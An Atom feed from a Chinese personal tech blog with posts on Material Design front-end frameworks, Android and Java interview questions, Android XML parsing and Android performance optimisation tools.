<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[彼岸-未来的博客]]></title>
  <subtitle><![CDATA[一分耕耘一分收获]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://science09.github.io/"/>
  <updated>2015-09-10T14:16:37.000Z</updated>
  <id>http://science09.github.io/</id>
  
  <author>
    <name><![CDATA[science09]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[9个目前流行的Material Design前端框架]]></title>
    <link href="http://science09.github.io/2015/05/13/9%E4%B8%AA%E7%9B%AE%E5%89%8D%E6%B5%81%E8%A1%8C%E7%9A%84Material-Design%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6/"/>
    <id>http://science09.github.io/2015/05/13/9个目前流行的Material-Design前端框架/</id>
    <published>2015-05-13T15:48:41.000Z</published>
    <updated>2015-09-10T14:16:37.000Z</updated>
    <content type="html"><![CDATA[<p>谷歌推出的Material Design风格已见有一些APP UI采用，视觉和交互体验都很棒，对于想尝试这个风格但又不懂实现一些效果的前端设计师们，可以试试今天设计达人网为大家分享的9个目前流行的Material Design前端框架。</p>
<a id="more"></a>
<p>这些前端框架的设计元素齐全，按钮、表单、布局及常用JS特效代码也有齐了，支持Responsive Design，还有的可以结合Bootstrap使用，相当不错，下面来看看介绍，并挑选一款你喜欢的Framework来制作你的新项目吧。</p>
<h3 id="Materialize">Materialize</h3><p>Materialize 是一个响应式的前端框架，设计样式及组件元素丰富。<br><img src="http://images.shejidaren.com/wp-content/uploads/2015/04/045516xAV.png" alt="Materialize"></p>
<p><a href="http://materializecss.com/" target="_blank" rel="external">查看框架</a></p>
<h3 id="Material_UI">Material UI</h3><p>Material UI 和上面的框架差不多，另外值得一提就是它自带的响应式日期选择很棒哦。<br><img src="http://images.shejidaren.com/wp-content/uploads/2015/04/045517J5c.png" alt="Material UI"></p>
<p><a href="http://material-ui.com/#/" target="_blank" rel="external">查看框架</a></p>
<h3 id="MUI">MUI</h3><p>MUI 是一个轻量级的Material Design框架，它的CSS和JS压缩版加起来不超过10KB，作者还提到可以用MUI的CSS来创建邮箱模板，支持流行的邮箱（如：Gmail, Apple Mail,Outlook等）</p>
<p><img src="http://images.shejidaren.com/wp-content/uploads/2015/04/045517iGV.png" alt="MUI"></p>
<p><a href="https://www.muicss.com/" target="_blank" rel="external">查看框架</a></p>
<h3 id="daemonite">daemonite</h3><p>daemonite 在之前的文章已经介绍过，轻量级。</p>
<p><img src="http://images.shejidaren.com/wp-content/uploads/2015/04/045521fAl.png" alt="daemonite"></p>
<p><a href="https://github.com/daemonite/material" target="_blank" rel="external">查看框架</a></p>
<h3 id="LumX">LumX</h3><p>LumX 这个前端框架主要是使用了Angular JS，针对手机端有不错的体验，如果懂Angular JS的建议使用这个框架。</p>
<p><img src="http://images.shejidaren.com/wp-content/uploads/2015/04/045521CdS.png" alt="LumX"></p>
<p><a href="http://ui.lumapps.com/" target="_blank" rel="external">查看框架</a></p>
<h3 id="Framaterial">Framaterial</h3><p>Framaterial 这个框架小编体验的时候，有的JS效果在桌面端感觉有点卡顿，动画不够流畅，但总体还是不错，有很丰富的组件元素。</p>
<p><img src="http://images.shejidaren.com/wp-content/uploads/2015/04/045521SBa.png" alt="Framaterial"></p>
<p><a href="http://framaterial.github.io/framaterial/" target="_blank" rel="external">查看框架</a></p>
<h3 id="Material_Framework">Material Framework</h3><p>Material Framework 这个前端框架有2组风格，一个是默认白色以及暗色调，缺点就是组件元素目前还不够多。</p>
<p><img src="http://images.shejidaren.com/wp-content/uploads/2015/04/045522mL6.png" alt="Material Framework"></p>
<p><a href="http://nt1m.github.io/material-framework/#introduction" target="_blank" rel="external">查看框架</a></p>
<h3 id="Material_Foundation">Material Foundation</h3><p>如果你懂得使用Foundation，那么这个前端框架可以选择了，直接为你的Foundation换肤。但组件还是有点少了。</p>
<p><img src="http://images.shejidaren.com/wp-content/uploads/2015/04/045522MAb.png" alt="Material Foundation"></p>
<p><a href="http://eucalyptuss.github.io/material-foundation/" target="_blank" rel="external">查看框架</a></p>
<h3 id="Material_Design_for_Bootstrap">Material Design for Bootstrap</h3><p>Material Design for Bootstrap 对于不想再去花时间了解新框架，并喜欢使用Bootstrap 的用户，那么你就用它吧。</p>
<p><img src="http://images.shejidaren.com/wp-content/uploads/2015/04/045523U4u.png" alt="Material Design for Bootstrap"></p>
<p><a href="http://fezvrasta.github.io/bootstrap-material-design/" target="_blank" rel="external">查看框架</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>谷歌推出的Material Design风格已见有一些APP UI采用，视觉和交互体验都很棒，对于想尝试这个风格但又不懂实现一些效果的前端设计师们，可以试试今天设计达人网为大家分享的9个目前流行的Material Design前端框架。</p>]]>
    
    </summary>
    
      <category term="CSS" scheme="http://science09.github.io/tags/CSS/"/>
    
      <category term="Material" scheme="http://science09.github.io/tags/Material/"/>
    
      <category term="前端框架" scheme="http://science09.github.io/tags/%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6/"/>
    
      <category term="WEB" scheme="http://science09.github.io/categories/WEB/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Android面试题]]></title>
    <link href="http://science09.github.io/2015/02/02/Android%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <id>http://science09.github.io/2015/02/02/Android面试题/</id>
    <published>2015-02-02T15:56:56.000Z</published>
    <updated>2015-09-10T14:10:23.000Z</updated>
    <content type="html"><![CDATA[<h3 id="1-_Android_ListView的优化">1. Android ListView的优化</h3><p> 1、使用Adapter提供的convertView<br>convertView是Adapter提供的视图缓存机制，当第一次显示数据的时候，adapter会创建n个（n等于页面可见的item的数目）convertView，当下次需要显示新的item的时候，adapter会循环利用这些已经创建的convertView，减少再次创建convertView所带来的开销，从而达到性能的提升。<br><a id="more"></a><br>2、使用自定义的视图缓存类<br>就是自定义一个视图缓存类，在这个类中保存我们在item中使用到的视图的引用，通过convertView的setTag方法和getTag方法来存储这个视图缓存类引用和重新获取这个视图缓存类引用，其目的也是为了减少重复创建视图时的开销。</p>
<p>3、减少不必要的视图更新<br>ListView在滚动时会请求重新获取item，来显示不同内容的item，而如果在获取item时比较耗时就会造成在滚动时出现卡顿的现象。那我们可以通过监听ListView的滚动事件来使ListView处于不同的滚动状态时做不同的事情，比如在ListView处于滚动过程中加载少量的显示数据，当ListView处于空闲的状态时再加载所有的数据，这样就可以减少ListView在滚动过程中的开销，从而提供ListView的滚动速度。</p>
<h3 id="2-_Activity的生命周期">2. Activity的生命周期</h3><p><img src="" alt=""></p>
<ol>
<li>整个的生命周期，从onCreate(Bundle)开始到onDestroy()结束。Activity在onCreate()设置所有的“全局”状态，在onDestory()释放所有的资源。例如：某个Activity有一个在后台运行的线程，用于从网络下载数据，则该Activity可以在onCreate()中创建线程,在onDestory()中停止线程。</li>
<li>可见的生命周期，从onStart()开始到onStop()结束。在这段时间，可以看到Activity在屏幕上，尽管有可能不在前台，不能和用户交互。在这两个接口之间，需要保持显示给用户的UI数据和资源等，例如：可以在onStart中注册一个IntentReceiver来监听数据变化导致UI的变动，当不再需要显示时候，可以在onStop()中注销它。onStart()，onStop()都可以被多次调用，因为Activity随时可以在可见和隐藏之间转换。</li>
<li>前台的生命周期，从onResume()开始到onPause()结束。在这段时间里，该Activity处于所有 Activity的最前面，和用户进行交互。Activity可以经常性地在resumed和paused状态之间切换，例如：当设备准备休眠时，当一个 Activity处理结果被分发时，当一个新的Intent被分发时。所以在这些接口方法中的代码应该属于非常轻量级的。</li>
</ol>
<h3 id="3-_Android的内存泄露">3. Android的内存泄露</h3><ol>
<li>查询数据库而没有关闭Cursor</li>
<li>调用registerReceiver后未调用unregisterReceiver().</li>
<li>未关闭InputStream/OutputStream</li>
<li>Bitmap使用后未调用recycle()</li>
<li>Activity中的对象的生命周期大于Activity</li>
</ol>
<h3 id="4-_Android的图片缓存原理">4. Android的图片缓存原理</h3><p>实现图片缓存也不难，需要有相应的cache策略。这里我采用 内存-文件-网络 三层cache机制，其中内存缓存包括强引用缓存和软引用缓存（SoftReference），其实网络不算cache，这里姑且也把它划到缓存的层次结构中。当根据url向网络拉取图片的时候，先从内存中找，如果内存中没有，再从缓存文件中查找，如果缓存文件中也没有，再从网络上通过http请求拉取图片。在键值对（key-value）中，这个图片缓存的key是图片url的hash值，value就是bitmap。所以，按照这个逻辑，只要一个url被下载过，其图片就被缓存起来了。</p>
<p>关于Java中对象的软引用（SoftReference），如果一个对象具有软引用，内存空间足够，垃 圾回收器就不会回收它；如果内存空间不足了，就会回收这些对象的内存。只要垃圾回收器没有回收它，该对象就可以被程序使用。软引用可用来实现内存敏感的高 速缓存。使用软引用能防止内存泄露，增强程序的健壮性。</p>
<p>从代码上来说，采用一个ImageManager来负责图片的管理和缓存，函数接口为public void loadBitmap(String url, Handler handler) ；其中url为要下载的图片地址，handler为图片下载成功后的回调，在handler中处理message，而message中包含了图片的信息以及bitmap对象。</p>
<h3 id="5-_如何处理Android多分辨率适配问题">5. 如何处理Android多分辨率适配问题</h3><p> UI界面在不同平台的适配受屏幕尺寸和屏幕密度影响，Android适配机制就是在资源后面添加对这两种因素的限定，通过不同的限定区分不同的平台资源，Android在使用资源的时候会优先选择满足本平台限定的资源，再找最接近条件的，再找默认（即不加限定），通过选择适合当前平台的资源来完成不同平台的适配。</p>
<h3 id="6-_什么是ANR，如何防止">6. 什么是ANR，如何防止</h3><p>在Android上，如果你的应用程序有一段时间响应不够灵敏，系统会向用户显示一个对话框，这个对话框称作应用程序无响应（ANR：Application Not Responding）对话框。用户可以选择让程序继续运行，但是，他们在使用你的应用程序时，并不希望每次都要处理这个对话框。因此，在程序里对响应性能的设计很重要，这样，系统不会显示ANR给用户。</p>
<p>任何运行在主线程中的方法，都要尽可能的只做少量的工作。特别是活动生命周期中的重要方法如onCreate()和 onResume()等更应如此。潜在的比较耗时的操作，如访问网络和数据库;或者是开销很大的计算，比如改变位图的大小，需要在一个单独的子线程中完成(或者是使用异步请求，如数据库操作)。但这并不意味着你的主线程需要进入阻塞状态已等待子线程结束 – 也不需要调用Therad.wait()或者Thread.sleep()方法。取而代之的是，主线程为子线程提供一个句柄(Handler)，让子线程在即将结束的时候调用它(xing:可以参看Snake的例子，这种方法与以前我们所接触的有所不同)。使用这种方法涉及你的应用程序，能够保证你的程序对输入保持良好的响应，从而避免因为输入事件超过5秒钟不被处理而产生的ANR。</p>
<h3 id="7-_JNI调用过程">7. JNI调用过程</h3>]]></content>
    <summary type="html">
    <![CDATA[<h3 id="1-_Android_ListView的优化">1. Android ListView的优化</h3><p> 1、使用Adapter提供的convertView<br>convertView是Adapter提供的视图缓存机制，当第一次显示数据的时候，adapter会创建n个（n等于页面可见的item的数目）convertView，当下次需要显示新的item的时候，adapter会循环利用这些已经创建的convertView，减少再次创建convertView所带来的开销，从而达到性能的提升。<br>]]>
    
    </summary>
    
      <category term="Android" scheme="http://science09.github.io/tags/Android/"/>
    
      <category term="面试" scheme="http://science09.github.io/tags/%E9%9D%A2%E8%AF%95/"/>
    
      <category term="Android" scheme="http://science09.github.io/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Java面试常见问题]]></title>
    <link href="http://science09.github.io/2015/02/02/Java%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/"/>
    <id>http://science09.github.io/2015/02/02/Java面试常见问题/</id>
    <published>2015-02-02T14:32:16.000Z</published>
    <updated>2015-09-10T14:16:00.000Z</updated>
    <content type="html"><![CDATA[<h3 id="1-_final,finally,finalize的区别?">1. final,finally,finalize的区别?</h3><p>final—修饰符（关键字）如果一个类被声明为final，意味着它不能再派生出新的子类，不能作为父类被继承。因此一个类不能既被声明为 abstract的，又被声明为final的。将变量或方法声明为final，可以保证它们在使用中不被改变。被声明为final的变量必须在声明时给定初值，而在以后的引用中只能读取，不可修改。被声明为final的方法也同样只能使用，不能重载。<br><a id="more"></a><br>finally—在异常处理时提供 finally 块来执行任何清除操作。如果抛出一个异常，那么相匹配的 catch 子句就会执行，然后控制就会进入 finally 块（如果有的话）。</p>
<p>finalize—方法名。Java 技术允许使用 finalize() 方法在垃圾收集器将对象从内存中清除出去之前做必要的清理工作。这个方法是由垃圾收集器在确定这个对象没有被引用时对这个对象调用的。它是在 Object 类中定义的，因此所有的类都继承了它。子类覆盖 finalize() 方法以整理系统资源或者执行其他清理工作。finalize() 方法是在垃圾收集器删除对象之前对这个对象调用的。</p>
<h3 id="2-_什么情况下你会使用ArrayList？什么时候你会选择LinkedList？">2. 什么情况下你会使用ArrayList？什么时候你会选择LinkedList？</h3><p>这又是一个大多数面试者都会困惑的问题。多数情况下，当你遇到访问元素比插入或者是删除元素更加频繁的时候，你应该使用ArrayList。另外一方面，当你在某个特别的索引中，插入或者是删除元素更加频繁，或者你压根就不需要访问元素的时候，你会选择LinkedList。这里的主要原因是，在ArrayList中访问元素的最糟糕的时间复杂度是”1″，而在LinkedList中可能就是”n”了。在ArrayList中增加或者删除某个元素，通常会调用System.arraycopy方法，这是一种极为消耗资源的操作，因此，在频繁的插入或者是删除元素的情况下，LinkedList的性能会更加好一点。</p>
<h3 id="3-_当传递ArrayList到某个方法中，或者某个方法返回ArrayList，什么时候要考虑安全隐患？如何修复安全违规这个问题呢？">3. 当传递ArrayList到某个方法中，或者某个方法返回ArrayList，什么时候要考虑安全隐患？如何修复安全违规这个问题呢？</h3><p>当array被当做参数传递到某个方法中，如果array在没有被复制的情况下直接被分配给了成员变量，那么就可能发生这种情况，即当原始的数组被调用的方法改变的时候，传递到这个方法中的数组也会改变。下面的这段代码展示的就是安全违规以及如何修复这个问题。</p>
<p>ArrayList被直接赋给成员变量——安全隐患：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMyArray</span><span class="params">(String[] myArray)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">this</span>.myArray = myArray;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>修复这个安全隐患：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMyArray</span><span class="params">(String[] newMyArray)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(newMyArray == <span class="keyword">null</span>) &#123;</span><br><span class="line">    	<span class="keyword">this</span>.myArray = <span class="keyword">new</span> String[<span class="number">0</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	<span class="keyword">this</span>.myArray = Arrays.copyOf(newMyArray, newMyArray.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-_如何复制某个ArrayList到另一个ArrayList中去？写出你的代码？">4. 如何复制某个ArrayList到另一个ArrayList中去？写出你的代码？</h3><p>下面就是把某个ArrayList复制到另一个ArrayList中去的几种技术：</p>
<ol>
<li>使用clone()方法，比如ArrayList newArray = oldArray.clone();</li>
<li>使用ArrayList构造方法，比如：ArrayList myObject = new ArrayList(myTempObject);</li>
<li>使用Collection的copy方法。</li>
</ol>
<p>注意1和2是浅拷贝(shallow copy)。</p>
<h3 id="5-_在索引中ArrayList的增加或者删除某个对象的运行过程？效率很低吗？解释一下为什么？">5. 在索引中ArrayList的增加或者删除某个对象的运行过程？效率很低吗？解释一下为什么？</h3><p>在ArrayList中增加或者是删除元素，要调用System.arraycopy这种效率很低的操作，如果遇到了需要频繁插入或者是删除的时候，你可以选择其他的Java集合，比如LinkedList。</p>
<h3 id="6-_错误和异常的区别(Error_vs_Exception)">6. 错误和异常的区别(Error vs Exception)</h3><p>1)  error都是继承自父类java.lang.Error，而exception都继承自java.lang.Exception.</p>
<p>2) java.lang.Error: An Error is a subclass of Throwable that indicates serious problems that a reasonable application should not try to catch. Most such errors are abnormal conditions. 即：Error是Throwable的子类，用于标记严重错误。合理的应用程序不应该去try/catch这种错误。绝大多数的错误都是非正常的，就根本不该出现的。     java.lang.Exception: The class Exception and its subclasses are a form of Throwable that indicates conditions that a reasonable application might want to catch. 即Exception 是Throwable的一种形式的子类，用于指示一种合理的程序想去catch的条件。即它仅仅是一种程序运行条件，而非严重错误，并且鼓励用户程序去catch它。</p>
<p>3)  Error和RuntimeException 及其子类都是未检查的异常（unchecked exceptions），而所有其他的Exception类都是检查了的异常（checked exceptions）.<br>checked exceptions: 通常是从一个可以恢复的程序中抛出来的，并且最好能够从这种异常中使用程序恢复。比如FileNotFoundException, ParseException等。<br>unchecked exceptions: 通常是如果一切正常的话本不该发生的异常，但是的确发生了。比如ArrayIndexOutOfBoundException, ClassCastException等。从语言本身的角度讲，程序不该去catch这类异常，虽然能够从诸如RuntimeException这样的异常中catch并恢复，但是并不鼓励终端程序员这么做，因为完全没要必要。因为这类错误本身就是bug，应该被修复，出现此类错误时程序就应该立即停止执行。 因此，面对Errors和unchecked exceptions应该让程序自动终止执行，程序员不该做诸如try/catch这样的事情，而是应该查明原因，修改代码逻辑。</p>
<h3 id="7-_String是最基本的数据类型吗?">7. String是最基本的数据类型吗?</h3><p>基本数据类型包括byte、int、char、long、float、double、boolean和short。</p>
<p>java.lang.String类是final类型的，因此不可以继承这个类、不能修改这个类。为了提高效率节省空间，我们应该用StringBuffer类</p>
<h3 id="8-_说出ArrayList,Vector,_LinkedList的存储性能和特性">8. 说出ArrayList,Vector, LinkedList的存储性能和特性</h3><p>ArrayList 和Vector都是使用数组方式存储数据，此数组元素数大于实际存储的数据以便增加和插入元素，它们都允许直接按序号索引元素，但是插入元素要涉及数组元素移动等内存操作，所以索引数据快而插入数据慢，Vector由于使用了synchronized方法（线程安全），通常性能上较ArrayList差，而LinkedList使用双向链表实现存储，按序号索引数据需要进行前向或后向遍历，但是插入数据时只需要记录本项的前后项即可，所以插入速度较快。</p>
<h3 id="9-_abstract_class和interface有什么区别?">9. abstract class和interface有什么区别?</h3><p>声明方法的存在而不去实现它的类被叫做抽象类（abstract class），它用于要创建一个体现某些基本行为的类，并为该类声明方法，但不能在该类中实现该类的情况。不能创建abstract 类的实例。然而可以创建一个变量，其类型是一个抽象类，并让它指向具体子类的一个实例。不能有抽象构造函数或抽象静态方法。Abstract 类的子类为它们父类中的所有抽象方法提供实现，否则它们也是抽象类为。取而代之，在子类中实现该方法。知道其行为的其它类可以在类中实现这些方法。</p>
<p>接口（interface）是抽象类的变体。在接口中，所有方法都是抽象的。多继承性可通过实现这样的接口而获得。接口中的所有方法都是抽象的，没有一个有程序体。接口只可以定义static final成员变量。接口的实现与子类相似，除了该实现类不能从接口定义中继承行为。当类实现特殊接口时，它定义（即将程序体给予）所有这种接口的方法。然后，它可以在实现了该接口的类的任何对象上调用接口的方法。由于有抽象类，它允许使用接口名作为引用变量的类型。通常的动态联编将生效。引用可以转换到接口类型或从接口类型转换，instanceof 运算符可以用来决定某对象的类是否实现了接口。</p>
<h3 id="10-_垃圾回收的优点和原理。并考虑2种回收机制。">10. 垃圾回收的优点和原理。并考虑2种回收机制。</h3><p>Java语言中一个显着的特点就是引入了垃圾回收机制，使c++程序员最头疼的内存管理的问题迎刃而解，它使得Java程序员在编写程序的时候不再需要考虑内存管理。由于有个垃圾回收机制， Java中的对象不再有”作用域”的概念，只有对象的引用才有”作用域”。垃圾回收可以有效的防止内存泄露，有效的使用可以使用的内存。垃圾回收器通常是作为一个单独的低级别的线程运行，不可预知的情况下对内存堆中已经死亡的或者长时间没有使用的对象进行清楚和回收，程序员不能实时的调用垃圾回收器对某个对象或所有对象进行垃圾回收。回收机制有分代复制垃圾回收和标记垃圾回收，增量垃圾回收。</p>
<h3 id="11-_请说出你所知道的线程同步的方法。">11. 请说出你所知道的线程同步的方法。</h3><p>wait():使一个线程处于等待状态，并且释放所持有的对象的lock。</p>
<p>sleep():使一个正在运行的线程处于睡眠状态，是一个静态方法，调用此方法要捕捉InterruptedException异常。</p>
<p>notify():唤醒一个处于等待状态的线程，注意的是在调用此方法的时候，并不能确切的唤醒某一个等待状态的线程，而是由JVM确定唤醒哪个线程，而且不是按优先级。</p>
<p>Allnotity():唤醒所有处入等待状态的线程，注意并不是给所有唤醒线程一个对象的锁，而是让它们竞争。</p>
<h3 id="12-_Java中的设计模式">12. Java中的设计模式</h3><p>Java中的23种设计模式：</p>
<p>Factory（工厂模式），Builder（建造模式），Factory Method（工厂方法模式），Prototype（原始模型模式），Singleton（单例模式），Facade（门面模式），Adapter（适配器模式），Bridge（桥梁模式），Composite（合成模式），Decorator（装饰模式），Flyweight（享元模式），Proxy（代理模式），Command（命令模式），Interpreter（解释器模式），Visitor（访问者模式），Iterator（迭代子模式），Mediator（调停者模式），Memento（备忘录模式），Observer（观察者模式），State（状态模式），Strategy（策略模式），Template Method（模板方法模式），Chain Of Responsibleity（责任链模式）</p>
<p>工厂模式：工厂模式是一种经常被使用到的模式，根据工厂模式实现的类可以根据提供的数据生成一组类中某一个类的实例，通常这一组类有一个公共的抽象父类并且实现了相同的方法，但是这些方法针对不同的数据进行了不同的操作。首先需要定义一个基类，该类的子类通过不同的方法实现了基类中的方法。然后需要定义一个工厂类，工厂类可以根据条件生成不同的子类实例。当得到子类的实例后，开发人员可以调用基类中的方法而不必考虑到底返回的是哪一个子类的实例。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="1-_final,finally,finalize的区别?">1. final,finally,finalize的区别?</h3><p>final—修饰符（关键字）如果一个类被声明为final，意味着它不能再派生出新的子类，不能作为父类被继承。因此一个类不能既被声明为 abstract的，又被声明为final的。将变量或方法声明为final，可以保证它们在使用中不被改变。被声明为final的变量必须在声明时给定初值，而在以后的引用中只能读取，不可修改。被声明为final的方法也同样只能使用，不能重载。<br>]]>
    
    </summary>
    
      <category term="Java" scheme="http://science09.github.io/tags/Java/"/>
    
      <category term="面试" scheme="http://science09.github.io/tags/%E9%9D%A2%E8%AF%95/"/>
    
      <category term="Java" scheme="http://science09.github.io/categories/Java/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Android解析XML格式数据]]></title>
    <link href="http://science09.github.io/2015/01/31/Android%E8%A7%A3%E6%9E%90XML%E6%A0%BC%E5%BC%8F%E6%95%B0%E6%8D%AE/"/>
    <id>http://science09.github.io/2015/01/31/Android解析XML格式数据/</id>
    <published>2015-01-31T15:41:36.000Z</published>
    <updated>2015-09-10T13:21:49.000Z</updated>
    <content type="html"><![CDATA[<p>XML在各种开发中都广泛应用，Android也不例外。作为承载数据的一个重要角色，如何读写XML成为Android开发中一项重要的技能。今天就由我向大家介绍一下在Android平台下几种常见的XML解析和创建的方法。<br><a id="more"></a><br>在Android中，常见的XML解析器分别为SAX解析器、DOM解析器和PULL解析器，下面，我将一一向大家详细介绍。</p>
<h3 id="SAX解析器：">SAX解析器：</h3><p>SAX(Simple API for XML)解析器是一种基于事件的解析器，它的核心是事件处理模式，主要是围绕着事件源以及事件处理器来工作的。当事件源产生事件后，调用事件处理器相应的处理方法，一个事件就可以得到处理。在事件源调用事件处理器中特定方法的时候，还要传递给事件处理器相应事件的状态信息，这样事件处理器才能够根据提供的事件信息来决定自己的行为。</p>
<p>SAX解析器的优点是解析速度快，占用内存少。非常适合在Android移动设备中使用。</p>
<h3 id="DOM解析器：">DOM解析器：</h3><p>DOM是基于树形结构的的节点或信息片段的集合，允许开发人员使用DOM API遍历XML树、检索所需数据。分析该结构通常需要加载整个文档和构造树形结构，然后才可以检索和更新节点信息。</p>
<p>由于DOM在内存中以树形结构存放，因此检索和更新效率会更高。但是对于特别大的文档，解析和加载整个文档将会很耗资源。</p>
<h3 id="PULL解析器：">PULL解析器：</h3><p>PULL解析器的运行方式和SAX类似，都是基于事件的模式。不同的是，在PULL解析过程中，我们需要自己获取产生的事件然后做相应的操作，而不像SAX那样由处理器触发一种事件的方法，执行我们的代码。PULL解析器小巧轻便，解析速度快，简单易用，非常适合在Android移动设备中使用，Android系统内部在解析各种XML时也是用PULL解析器。</p>
<p>以上三种解析器，都是非常实用的解析器，我将会一一介绍。我们将会使用这三种解析技术完成一项共同的任务。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>XML在各种开发中都广泛应用，Android也不例外。作为承载数据的一个重要角色，如何读写XML成为Android开发中一项重要的技能。今天就由我向大家介绍一下在Android平台下几种常见的XML解析和创建的方法。<br>]]>
    
    </summary>
    
      <category term="Android" scheme="http://science09.github.io/tags/Android/"/>
    
      <category term="XML解析" scheme="http://science09.github.io/tags/XML%E8%A7%A3%E6%9E%90/"/>
    
      <category term="Android" scheme="http://science09.github.io/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Android App 性能优化实践]]></title>
    <link href="http://science09.github.io/2015/01/31/Android-App-%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E5%AE%9E%E8%B7%B5/"/>
    <id>http://science09.github.io/2015/01/31/Android-App-性能优化实践/</id>
    <published>2015-01-31T15:36:46.000Z</published>
    <updated>2015-09-10T13:16:39.000Z</updated>
    <content type="html"><![CDATA[<h2 id="工具">工具</h2><p>Hierarchy Viewer 是 Android SDK 自带的 Layout 嵌套检查工具，以可视化的布局角度直观获取 Layout 布局设计和各种属性信息，来帮助我们完成优化布局的设计。需要注意的是，出于安全考虑 Hierarchy Viewer 只能连接Android开发版手机(需要安装ViewServer)或是模拟器。<br><a id="more"></a><br><img src="D:\Study_Material\建站资料\博客文章\PicResource\performance-tuning-on-android-1.png" alt=""></p>
<p>注意上图右半部分显示的时间</p>
<ul>
<li>Measure： 0.977ms</li>
<li>Layout： 0.167ms</li>
<li>Draw： 2.717ms</li>
</ul>
<p>我们知道Android View在绘制图形的时候主要耗时的操作就在 Measure、Layout 和 Draw 这三个过程；并且任何一个 View 绘制时间不能超过 16.7ms(每秒60帧才能保证流畅度)。</p>
<p>如果 UI 出现卡顿或掉帧，那么 Hierarchy Viewer 这个工具及其有用，可以分析当前 View 是哪些 View 以及是 View 的哪个过程加载延迟，通过这些信息基本可定位到局部 Code。</p>
<h4 id="如何让QC快速追踪和定位性能问题？">如何让QC快速追踪和定位性能问题？</h4><p>当然使用 Android 开发者工具里的 <a href="http://developer.android.com/about/versions/jelly-bean.html" target="_blank" rel="external">Profile GPU rendering (GPU呈现模式分析)</a> 工具(Android4.1以上)。它能够从屏幕上活动的所有Android Activity生成性能视图，其中绿线代表 16ms，频繁超过此线的 Activity 就要排查性能问题了。</p>
<h4 id="如何定位到某个方法？">如何定位到某个方法？</h4><p>用 Hierarchy Viewer 知道是哪一个子 View 耗时比较多，找到此 View 的Code，那么如何定位到具体某个方法里呢？ 当然需要 <a href="http://developer.android.com/tools/debugging/debugging-tracing.html" target="_blank" rel="external">traceview</a> 工具。traceview 工具十分强大，可以轻松把每个方法占用 CPU 时间计算出来，找到占用时间最长的方法，然后分析此方法即可。</p>
<p>Lint 工具已经集成于 Android Studio，同样是非常强大的工具。它会给出 Layout 优化提示(既包括图片资源、layout文件，也有定义的String常量和Color常量以及Layout写法不规范)，告诉你哪些资源没有被引用，Manifest文件的错误等；我主要用 lint 来哪些资源文件没有被引用到(给APK瘦身)，以及部分代码不规范的地方。</p>
<h4 id="内存优化工具">内存优化工具</h4><p>Memory Monitor：查看整个app所占用的内存，以及发生GC的时刻，短时间内发生大量的GC操作是一个危险的信号(发生内存抖动)。</p>
<p>Allocation Tracker：追踪内存的分配。</p>
<p>Heap Tool：查看当前内存快照，便于对比分析哪些对象有可能是泄漏了的。</p>
<h2 id="布局优化">布局优化</h2><h4 id="布局标签">布局标签</h4><p><include> 标签，将布局中公共部分提取出来共用；例如网易新闻一条新闻的标题栏和评论界面的标题栏。</include></p>
<p><viewstub> 标签，同 include，可引入布局，但是默认情况引入的布局不会占用资源，在解析当前 Layout 时节省计算、内存资源。当需要加载此 View 的时候，需要动态 inflate 起来。</viewstub></p>
<blockquote>
<p> Tips：将一个view设置为GONE不会被系统解析，从而提高layout解析速度，而VISIBLE和INVISIBLE这两个可见性属性会被正常解析。</p>
</blockquote>
<p><merge> 标签，解决 Layout 嵌套过多的问题，通过工具通过 hierarchy viewer 可直观的显示出来。</merge></p>
<h4 id="其他">其他</h4><p>减少 inflate 次数：inflate 是比较耗资源的，当内存够用时，可以将 View 缓存起来，下次直接使用；用空间换时间。</p>
<h2 id="代码Tips">代码Tips</h2><p><a href="http://www.trinea.cn/android/java-android-performance/" target="_blank" rel="external">性能优化之Java(Android)代码优化</a>，这篇博客详细介绍了如何进行代码优化，包括缓存、数据存储、异步、数据库和网络等操作的优化。</p>
<p>关于缓存，上文没有提到一个重要的库：DiskLruCache；DiskLruCache 是关于数据硬盘缓存的，<a href="http://blog.csdn.net/guolin_blog/article/details/28863651" target="_blank" rel="external">Android DiskLruCache</a>完全解析，硬盘缓存的最佳方案 这篇博客详细介绍了 DiskLruCache 使用方法和注意事项。</p>
<p><strong>避免随意使用静态变量</strong>，当某个对象被定义为stataic变量所引用，虚拟机通常是不会回收这个对象所占有的内存。</p>
<p>避免过多过常的创建java对象，JVM 创建和回收耗时，频繁使用对象，最好创建缓存；每次回收对象，都是 STW(Stop the World)，所以如果对象过多，可能引起卡顿(大于16ms，引起掉帧)。可用 Memory Monitor 或 Allocation Tracker 工具来查看这类问题。</p>
<p><strong>多使用局部变量</strong>，函数执行完，就释放内存被虚拟机回收。</p>
